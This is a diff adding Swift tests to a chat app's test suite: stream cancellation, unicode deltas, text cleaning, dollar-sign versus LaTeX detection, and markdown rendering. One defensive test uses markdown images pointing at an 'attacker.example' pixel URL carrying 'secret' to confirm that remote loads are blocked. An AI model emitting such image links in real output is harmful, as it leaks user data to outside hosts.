@@ -2423,6 +2423,32 @@ struct ChatLLMTests {
         #expect(conversation.messages.allSatisfy { $0.role == .user })
     }
 
+    @Test func cancelGenerationAndWaitFinishesStreamBeforeReturning() async throws {
+        let schema = Schema([Conversation.self, ChatLLM.Message.self, MessageAttachment.self])
+        let container = try ModelContainer(
+            for: schema,
+            configurations: [ModelConfiguration(isStoredInMemoryOnly: true)]
+        )
+        let context = ModelContext(container)
+        let conversation = Conversation(title: "Test")
+        let viewModel = ChatViewModel(
+            generator: BlockingLLMGenerator(),
+            context: context,
+            conversation: conversation
+        )
+        let sendTask = Task { await viewModel.send(userText: "Hello") }
+
+        for _ in 0..<50 {
+            if viewModel.isGenerating { break }
+            try? await Task.sleep(for: .milliseconds(20))
+        }
+
+        #expect(viewModel.isGenerating)
+        #expect(await viewModel.cancelGenerationAndWait())
+        await sendTask.value
+        #expect(!viewModel.isGenerating)
+    }
+
     @Test func streamingChunkMergePreservesSingleCharacterNumericChunks() {
         let merged = ChatViewModel.mergedStreamingChunk(
             currentText: "10",
@@ -2452,6 +2478,23 @@ struct ChatLLMTests {
         #expect(merged == current + repeated)
     }
 
+    @Test func foundationStreamingDeltaPreservesUnicodeAndYieldsOnlyNewText() {
+        var yieldedUTF8Count = 0
+
+        #expect(OnDeviceLLMGenerator.incrementalDelta(
+            from: "Hello 👋",
+            afterUTF8Count: &yieldedUTF8Count
+        ) == "Hello 👋")
+        #expect(OnDeviceLLMGenerator.incrementalDelta(
+            from: "Hello 👋 world",
+            afterUTF8Count: &yieldedUTF8Count
+        ) == " world")
+        #expect(OnDeviceLLMGenerator.incrementalDelta(
+            from: "Hello 👋 world",
+            afterUTF8Count: &yieldedUTF8Count
+        ) == nil)
+    }
+
     @Test func finalTextCleaningPreservesCamelCaseAndCodeIdentifiers() {
         let input = "Use toFixed(2), autoFocus, isEnabled, and beginIndex exactly as written in this code example."
 
@@ -2479,6 +2522,12 @@ struct ChatLLMTests {
         #expect(ChatViewModel.cleanGlitchedText(input) == input)
     }
 
+    @Test func finalTextCleaningPreservesRepeatedNumbersAndCodeSeparators() {
+        let input = "The total is 10000000, the ratio is 0.33333333, and the code separator is print(\"----------\")."
+
+        #expect(ChatViewModel.cleanGlitchedText(input) == input)
+    }
+
     @Test func nativeMarkdownParserPreservesParagraphWhitespaceAndInlineFormatting() throws {
         let parsed = try #require(NativeMarkdownParser.attributedString(from: """
         First paragraph.
@@ -2491,13 +2540,35 @@ struct ChatLLMTests {
 
     @Test func ordinaryParagraphsUseNativeMarkdownRenderer() {
         #expect(!RichTextFeatureDetector.requiresAdvancedRendering("First paragraph.\n\nSecond paragraph."))
-        #expect(RichTextFeatureDetector.requiresAdvancedRendering("A formula: $x^2$"))
+        #expect(!RichTextFeatureDetector.requiresAdvancedRendering(
+            "The basic plan costs $5 per month and the pro plan costs $12 per month."
+        ))
+        #expect(RichTextFeatureDetector.requiresAdvancedRendering(#"A formula: \(x^2\)"#))
+        #expect(RichTextFeatureDetector.requiresAdvancedRendering("A display formula: $$x^2$$"))
+    }
+
+    @Test func nativeLatexProcessorPreservesDollarAmounts() {
+        let input = "The basic plan costs $5 per month and the pro plan costs $12 per month."
+
+        #expect(LatexProcessor.process(input) == input)
     }
 
     @Test func blockMarkdownUsesAdvancedRenderer() {
         #expect(RichTextFeatureDetector.requiresAdvancedRendering("## Heading"))
         #expect(RichTextFeatureDetector.requiresAdvancedRendering("- First\n- Second"))
         #expect(RichTextFeatureDetector.requiresAdvancedRendering("> Quoted text"))
+    }
+
+    @Test func richMarkdownRendererBlocksRemoteResourceLoads() {
+        #expect(RichTextFeatureDetector.requiresAdvancedRendering(
+            "![tracking pixel](https://attacker.example/pixel?q=secret)"
+        ))
+        #expect(RichTextFeatureDetector.requiresAdvancedRendering(
+            "![tracking pixel][remote]\n\n[remote]: https://attacker.example/pixel"
+        ))
+        #expect(RichMarkdownRenderingPolicy.disabledMarkdownRules.contains("image"))
+        #expect(RichMarkdownRenderingPolicy.contentSecurityPolicy.contains("default-src 'none'"))
+        #expect(RichMarkdownRenderingPolicy.contentSecurityPolicy.contains("img-src data:"))
     }
 
     @Test func webSearchBridgeReturnsRecoverableErrorForMissingQueryArgument() async throws {
